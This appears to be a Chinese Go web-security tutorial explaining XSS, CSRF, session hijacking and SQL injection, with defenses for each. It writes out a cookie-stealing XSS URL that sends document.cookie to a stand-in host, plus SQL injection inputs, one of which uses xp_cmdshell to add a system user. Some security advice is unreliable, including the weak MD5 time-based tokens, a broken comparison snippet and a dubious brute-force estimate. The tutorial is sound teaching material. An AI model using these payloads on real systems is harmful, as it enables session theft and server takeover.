# 一 跨站脚本攻击XSS

#### 1.1 XSS简介

动态站点很容易受到跨站脚本攻击（Cross Site Scripting, 安全专家们通常将其缩写成 XSS）。它允许攻击者将恶意代码植入到提供给其它用户使用的页面中，XSS涉及到三方，即攻击者、客户端与Web应用。XSS的攻击目标是为了盗取存储在客户端的cookie或者其他网站用于识别客户端身份的敏感信息。  

XSS通常可以分为两大类：
- 存储型XSS：主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论等。
- 反射型XSS：主要做法是将脚本代码加入URL地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。

XSS目前主要的手段和目的如下：
- 盗用cookie，获取敏感信息。
- 利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。
- 利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击者）用户的身份执行一些管理动作，或执行一些如:发微博、加好友、发私信等常规操作，前段时间新浪微博就遭遇过一次XSS。
- 利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。
- 在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果

#### 1.2 XSS攻击示例
```
# 一个常见的get请求：
	http://localhost:3000/?name=ruyue
	hello ruyue

# 在URL中插入js代码：
	http://localhost:3000?name=&#60;script&#62;alert(&#39;ruyue,xss&#39;)&#60;/script&#62;
	此时浏览器会出现弹窗

# 盗取cookie：
	http://localhost:3000/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;
```

这样就可以把当前的cookie发送到指定的站点：`www.xxx.com`。尤其现在流行短网址，用户是无法识别的。  

#### 1.3 XSS的预防


目前防御XSS主要有如下几种方式（推荐结合使用）：

- 过滤特殊字符：即不相信任何用户的输入，对用户输入内容进行过滤。Go的html/template里面带有下面几个函数可以用于过滤
  - func HTMLEscape(w io.Writer, b []byte)  //把b进行转义之后写到w
  - func HTMLEscapeString(s string) string  //转义s之后返回结果字符串
  - func HTMLEscaper(args ...interface{}) string //支持多个参数一起转义，返回结果字符串
- 使用HTTP头指定类型：
	- `w.Header().Set("Content-Type","text/javascript")`，这样就可以让浏览器解析javascript代码，而不会是html输出。

示例：
```Go

fmt.Println("username:", template.HTMLEscapeString(r.Form.Get("username"))) //输出到服务器端
fmt.Println("password:", template.HTMLEscapeString(r.Form.Get("password")))
template.HTMLEscape(w, []byte(r.Form.Get("username"))) //输出到客户端
```
如果我们输入的username是`<script>alert()</script>`,那么我们可以在浏览器上面看到输出如下所示：

Go的html/template包默认帮你过滤了html标签，但是有时候你只想要输出这个`<script>alert()</script>`看起来正常的信息，该怎么处理？请使用text/template。请看下面的例子：
```Go

import "text/template"
...
t, err := template.New("foo").Parse(`{{define "T"}}Hello, {{.}}!{{end}}`)
err = t.ExecuteTemplate(out, "T", "<script>alert('you have been pwned')</script>")
```
输出

	Hello, <script>alert('you have been pwned')</script>!

或者使用template.HTML类型
```Go

import "html/template"
...
t, err := template.New("foo").Parse(`{{define "T"}}Hello, {{.}}!{{end}}`)
err = t.ExecuteTemplate(out, "T", template.HTML("<script>alert('you have been pwned')</script>"))
```
输出

	Hello, <script>alert('you have been pwned')</script>!

转换成`template.HTML`后，变量的内容也不会被转义

转义的例子：
```Go

import "html/template"
...
t, err := template.New("foo").Parse(`{{define "T"}}Hello, {{.}}!{{end}}`)
err = t.ExecuteTemplate(out, "T", "<script>alert('you have been pwned')</script>")
```
转义之后的输出：

	Hello, &lt;script&gt;alert(&#39;you have been pwned&#39;)&lt;/script&gt;!

## 二 预防CSRF攻击

#### 2.1 CSRF简介

CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。

那么CSRF到底能够干嘛呢？你可以这样简单的理解：攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求。攻击者只要借助少许的社会工程学的诡计，例如通过QQ等聊天软件发送的链接(有些还伪装成短域名，用户无法分辨)，攻击者就能迫使Web应用的用户去执行攻击者预设的操作。例如，当用户登录网络银行去查看其存款余额，在他没有退出时，就点击了一个QQ好友发来的链接，那么该用户银行帐户中的资金就有可能被转移到攻击者指定的帐户中。

所以遇到CSRF攻击时，将对终端用户的数据和操作指令构成严重的威胁；当受攻击的终端用户具有管理员帐户的时候，CSRF攻击将危及整个Web应用程序。

#### 2.2 CSRF的原理

下图简单阐述了CSRF攻击的思想

![](images/9.1.csrf.png?raw=true)

图9.1 CSRF的攻击过程

从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤 ：

- 1.登录受信任网站A，并在本地生成Cookie 。
- 2.在不退出A的情况下，访问危险网站B。

看到这里，读者也许会问：“如果我不满足以上两个条件中的任意一个，就不会受到CSRF的攻击”。是的，确实如此，但你不能保证以下情况不会发生：

- 你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站，特别现在浏览器都是支持多tab的。
- 你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。
- 上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。

因此对于用户来说很难避免在登陆一个网站之后不点击一些链接进行其他操作，所以随时可能成为CSRF的受害者。

CSRF攻击主要是因为Web的隐式身份验证机制，Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。

#### 2.3 预防CSRF

过上面的介绍，读者是否觉得这种攻击很恐怖，意识到恐怖是个好事情，这样会促使你接着往下看如何改进和防止类似的漏洞出现。

CSRF的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行。

服务端的预防CSRF攻击的方式方法有多种，但思想上都是差不多的，主要从以下2个方面入手：

- 1、正确使用GET,POST和Cookie；
- 2、在非GET请求中增加伪随机数；

我们上一章介绍过REST方式的Web应用，一般而言，普通的Web应用都是以GET、POST为主，还有一种请求是Cookie方式。我们一般都是按照如下方式设计应用：

1、GET常用在查看，列举，展示等不需要改变资源属性的时候；

2、POST常用在下达订单，改变一个资源的属性或者做其他一些事情；

接下来我就以Go语言来举例说明，如何限制对资源的访问方法：

```Go

mux.Get("/user/:uid", getuser)
mux.Post("/user/:uid", modifyuser)

```
这样处理后，因为我们限定了修改只能使用POST，当GET方式请求时就拒绝响应，所以上面图示中GET方式的CSRF攻击就可以防止了，但这样就能全部解决问题了吗？当然不是，因为POST也是可以模拟的。

因此我们需要实施第二步，在非GET方式的请求中增加随机数，这个大概有三种方式来进行：

- 为每个用户生成一个唯一的cookie token，所有表单都包含同一个伪随机值，这种方案最简单，因为攻击者不能获得第三方的Cookie(理论上)，所以表单中的数据也就构造失败，但是由于用户的Cookie很容易由于网站的XSS漏洞而被盗取，所以这个方案必须要在没有XSS的情况下才安全。
- 每个请求使用验证码，这个方案是完美的，因为要多次输入验证码，所以用户友好性很差，所以不适合实际运用。
- 不同的表单包含一个不同的伪随机值，我们在4.4小节介绍“如何防止表单多次递交”时介绍过此方案，复用相关代码，实现如下：

生成随机数token

```Go

h := md5.New()
io.WriteString(h, strconv.FormatInt(crutime, 10))
io.WriteString(h, "ganraomaxxxxxxxxx")
token := fmt.Sprintf("%x", h.Sum(nil))

t, _ := template.ParseFiles("login.gtpl")
t.Execute(w, token)

```
输出token
```html

<input type="hidden" name="token" value="{{.}}">

```
验证token

```Go

r.ParseForm()
token := r.Form.Get("token")
if token != "" {
	//验证token的合法性
} else {
	//不存在token报错
}

```
这样基本就实现了安全的POST，但是也许你会说如果破解了token的算法呢，按照理论上是，但是实际上破解是基本不可能的，因为有人曾计算过，暴力破解该串大概需要2的11次方时间。

## 三 预防session劫持

在session技术中，客户端和服务端通过session的标识符来维护会话， 但这个标识符很容易就能被嗅探到，从而被其他人利用。它是中间人攻击的一种类型。  

制作一个count计数器：
```Go

func count(w http.ResponseWriter, r *http.Request) {
	sess := globalSessions.SessionStart(w, r)
	ct := sess.Get("countnum")
	if ct == nil {
		sess.Set("countnum", 1)
	} else {
		sess.Set("countnum", (ct.(int) + 1))
	}
	t, _ := template.ParseFiles("count.gtpl")
	w.Header().Set("Content-Type", "text/html")
	t.Execute(w, sess.Get("countnum"))
}

```
count.gtpl的代码如下所示：
```Go

Hi. Now count:{{.}}
```
访问：localhost:9090/count，不断刷新浏览器，count数字将不断增长，当数字显示为6时，查看开发者工具中的value。将这些内容在另外一个浏览器中重新模拟发送请求，我们发现另外一个浏览器同样可以得到结果。
可以看到虽然换了浏览器，但是我们却获得了sessionID，然后模拟了cookie存储的过程。这个例子是在同一台计算机上做的，不过即使换用两台来做，其结果仍然一样。此时如果交替点击两个浏览器里的链接你会发现它们其实操纵的是同一个计数器。不必惊讶，此处firefox盗用了chrome和goserver之间的维持会话的钥匙，即gosessionid，这是一种类型的“会话劫持”。在goserver看来，它从http请求中得到了一个gosessionid，由于HTTP协议的无状态性，它无法得知这个gosessionid是从chrome那里“劫持”来的，它依然会去查找对应的session，并执行相关计算。与此同时 chrome也无法得知自己保持的会话已经被“劫持”。
通过上面session劫持的简单演示可以了解到session一旦被其他人劫持，就非常危险，劫持者可以假装成被劫持者进行很多非法操作。那么如何有效的防止session劫持呢？

其中一个解决方案就是sessionID的值只允许cookie设置，而不是通过URL重置方式设置，同时设置cookie的httponly为true,这个属性是设置是否可通过客户端脚本访问这个设置的cookie，第一这个可以防止这个cookie被XSS读取从而引起session劫持，第二cookie设置不会像URL重置方式那么容易获取sessionID。

第二步就是在每个请求里面加上token，实现类似前面章节里面讲的防止form重复递交类似的功能，我们在每个请求里面加上一个隐藏的token，然后每次验证这个token，从而保证用户的请求都是唯一性。
```Go

h := md5.New()
salt:="ruyue%^7&8888"
io.WriteString(h,salt+time.Now().String())
token:=fmt.Sprintf("%x",h.Sum(nil))
if r.Form["token"]!=token{
	//提示登录
}
sess.Set("token",token)

```

还有一个解决方案就是，我们给session额外设置一个创建时间的值，一旦过了一定的时间，我们销毁这个sessionID，重新生成新的session，这样可以一定程度上防止session劫持的问题。
```Go

createtime := sess.Get("createtime")
if createtime == nil {
	sess.Set("createtime", time.Now().Unix())
} else if (createtime.(int64) + 60) < (time.Now().Unix()) {
	globalSessions.SessionDestroy(w, r)
	sess = globalSessions.SessionStart(w, r)
}
```
session启动后，我们设置了一个值，用于记录生成sessionID的时间。通过判断每次请求是否过期(这里设置了60秒)定期生成新的ID，这样使得攻击者获取有效sessionID的机会大大降低。

上面两个手段的组合可以在实践中消除session劫持的风险，一方面，	由于sessionID频繁改变，使攻击者难有机会获取有效的sessionID；另一方面，因为sessionID只能在cookie中传递，然后设置了httponly，所以基于URL攻击的可能性为零，同时被XSS获取sessionID也不可能。最后，由于我们还设置了MaxAge=0，这样就相当于session cookie不会留在浏览器的历史记录里面。

## 四 SQL注入

#### 4.1 SQL注入简介

SQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。

而造成SQL注入的原因是因为程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的SQL查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码。

#### 4.2 SQL注入案例

很多Web开发者没有意识到SQL查询是可以被篡改的，从而把SQL查询当作可信任的命令。殊不知，SQL查询是可以绕开访问控制，从而绕过身份验证和权限检查的。更有甚者，有可能通过SQL查询去运行主机系统级的命令。

下面将通过一些真实的例子来详细讲解SQL注入的方式。

考虑以下简单的登录表单：
```html

<form action="/login" method="POST">
<p>Username: <input type="text" name="username" /></p>
<p>Password: <input type="password" name="password" /></p>
<p><input type="submit" value="登陆" /></p>
</form>

```
我们的处理里面的SQL可能是这样的：
```Go

username:=r.Form.Get("username")
password:=r.Form.Get("password")
sql:="SELECT * FROM user WHERE username='"+username+"' AND password='"+password+"'"

```
如果用户的输入的用户名如下，密码任意
```Go

myuser' or 'foo' = 'foo' --

```
那么我们的SQL变成了如下所示：
```Go

SELECT * FROM user WHERE username='myuser' or 'foo' = 'foo' --'' AND password='xxx'
```
在SQL里面`--`是注释标记，所以查询语句会在此中断。这就让攻击者在不知道任何合法用户名和密码的情况下成功登录了。

对于MSSQL还有更加危险的一种SQL注入，就是控制系统，下面这个可怕的例子将演示如何在某些版本的MSSQL数据库上执行系统命令。
```Go

sql:="SELECT * FROM products WHERE name LIKE '%"+prod+"%'"
Db.Exec(sql)
```
如果攻击提交`a%' exec master..xp_cmdshell 'net user test testpass /ADD' --`作为变量 prod的值，那么sql将会变成
```Go

sql:="SELECT * FROM products WHERE name LIKE '%a%' exec master..xp_cmdshell 'net user test testpass /ADD'--%'"
```
MSSQL服务器会执行这条SQL语句，包括它后面那个用于向系统添加新用户的命令。如果这个程序是以sa运行而 MSSQLSERVER服务又有足够的权限的话，攻击者就可以获得一个系统帐号来访问主机了。

>虽然以上的例子是针对某一特定的数据库系统的，但是这并不代表不能对其它数据库系统实施类似的攻击。针对这种安全漏洞，只要使用不同方法，各种数据库都有可能遭殃。


#### 4.3 预防SQL注入

也许你会说攻击者要知道数据库结构的信息才能实施SQL注入攻击。确实如此，但没人能保证攻击者一定拿不到这些信息，一旦他们拿到了，数据库就存在泄露的危险。如果你在用开放源代码的软件包来访问数据库，比如论坛程序，攻击者就很容易得到相关的代码。如果这些代码设计不良的话，风险就更大了。目前Discuz、phpwind、phpcms等这些流行的开源程序都有被SQL注入攻击的先例。

这些攻击总是发生在安全性不高的代码上。所以，永远不要信任外界输入的数据，特别是来自于用户的数据，包括选择框、表单隐藏域和 cookie。就如上面的第一个例子那样，就算是正常的查询也有可能造成灾难。

SQL注入攻击的危害这么大，那么该如何来防治呢?下面这些建议或许对防治SQL注入有一定的帮助。

1. 严格限制Web应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害。
2. 检查输入的数据是否具有所期望的数据格式，严格限制变量的类型，例如使用regexp包进行一些匹配处理，或者使用strconv包对字符串转化成其他基本类型的数据进行判断。
3. 对进入数据库的特殊字符（'"\尖括号&*;等）进行转义处理，或编码转换。Go 的`text/template`包里面的`HTMLEscapeString`函数可以对字符串进行转义处理。
4. 所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中，即不要直接拼接SQL语句。例如使用`database/sql`里面的查询函数`Prepare`和`Query`，或者`Exec(query string, args ...interface{})`。
5. 在应用发布之前建议使用专业的SQL注入检测工具进行检测，以及时修补被发现的SQL注入漏洞。网上有很多这方面的开源工具，例如sqlmap、SQLninja等。
6. 避免网站打印出SQL错误信息，比如类型错误、字段不匹配等，把代码里的SQL语句暴露出来，以防止攻击者利用这些错误信息进行SQL注入。